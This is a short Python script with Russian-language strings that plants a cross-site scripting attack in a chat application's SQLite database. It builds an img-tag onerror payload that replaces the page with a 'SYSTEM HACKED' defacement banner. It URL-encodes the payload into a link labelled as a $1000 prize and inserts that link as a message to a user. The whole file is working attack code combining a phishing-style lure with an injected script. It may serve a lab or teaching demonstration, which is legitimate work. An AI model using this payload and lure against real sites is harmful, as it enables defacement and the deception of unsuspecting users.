import sqlite3
import urllib.parse

js_payload = """<img src=x onerror="document.body.innerHTML='<div style=\\'background:#111;color:red;font-size:50px;text-align:center;padding-top:20vh;height:100vh;font-family:monospace;\\'>[!] XSS: СИСТЕМА ВЗЛОМАНА</div>'">"""

encoded_payload = urllib.parse.quote(js_payload)

payload = f"""<a href="/chat?name={encoded_payload}">Нажми сюда, чтобы выиграть 1000$!</a>"""

conn = sqlite3.connect('app.db')
conn.execute(
    "INSERT INTO messages (sender, recipient, text) VALUES (?, ?, ?)",
    ('Иван', 'ivan', payload)
)
conn.commit()
conn.close()
print("Ссылка с дефейсом внедрена в БД.")